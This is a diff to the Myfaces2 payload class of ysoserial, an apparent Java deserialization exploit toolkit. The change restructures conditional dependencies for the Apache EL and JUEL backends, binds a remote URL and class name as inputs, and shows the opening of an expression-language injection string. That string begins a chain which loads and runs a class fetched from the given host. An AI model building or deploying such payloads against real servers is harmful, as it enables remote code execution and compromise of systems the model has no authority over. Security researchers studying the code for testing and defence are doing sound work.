@@ -2,7 +2,14 @@ package ysoserial.payloads;
 
 
 
+import java.net.URL;
+
+import ysoserial.annotation.Bind;
+import ysoserial.interfaces.ObjectPayload;
+import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
+import ysoserial.payloads.annotation.DynamicDependencies;
+import ysoserial.payloads.annotation.DynamicDependencies.Condition;
 import ysoserial.payloads.util.PayloadRunner;
 
 
@@ -27,23 +34,50 @@ import ysoserial.payloads.util.PayloadRunner;
  * 
  * @author mbechler
  */
-@PayloadTest ( harness = "ysoserial.payloads.MyfacesTest" )
-public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
-    
-    public static String[] getDependencies () {
-        return Myfaces1.getDependencies();
-    }
+@DynamicDependencies( { 
+	@Condition(
+			condition = "System.getProperty('el') == null || 'apache'.equals(System.getProperty('el'))",
+			deps = @Dependencies({
+            	"commons-collections:commons-collections:3.2",
+            	"commons-beanutils:commons-beanutils:1.8.3",
+                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
+                "org.mortbay.jasper:apache-el:8.0.27",
+                "javax.servlet:javax.servlet-api:3.1.0",
+
+                // deps for mocking the FacesContext
+                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
+            })
+	),
+	@Condition(
+			condition = "'juel'.equals(System.getProperty('el'))",
+			deps = @Dependencies( {
+            	"commons-collections:commons-collections:3.2",
+            	"commons-beanutils:commons-beanutils:1.8.3",
+                "org.apache.myfaces.core:myfaces-impl:2.2.9", "org.apache.myfaces.core:myfaces-api:2.2.9", 
+                "de.odysseus.juel:juel-impl:2.2.7", "de.odysseus.juel:juel-api:2.2.7",
+                "javax.servlet:javax.servlet-api:3.1.0",
+
+                // deps for mocking the FacesContext
+                "org.mockito:mockito-core:1.10.19", "org.hamcrest:hamcrest-core:1.1", "org.objenesis:objenesis:2.1"
+            })
+	)
+})
+@PayloadTest ( skip="broken in dynamic classloader", harness = "ysoserial.payloads.MyfacesTest" )
+public class Myfaces2 implements ObjectPayload<Object> {
+	
+	@Bind private URL url;
+	@Bind private String className;
     
 
-    public Object getObject ( String command ) throws Exception {
-        int sep = command.lastIndexOf(':');
-        if ( sep < 0 ) {
-            throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
-        }
+    /**
+	 * @deprecated Use {@link #getObject()} instead
+	 */
+	public Object getObject ( String command ) throws Exception {
+		return getObject();
+	}
 
-        String url = command.substring(0, sep);
-        String className = command.substring(sep + 1);
-        
+
+	public Object getObject ( ) throws Exception {
         // based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
         String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";
         
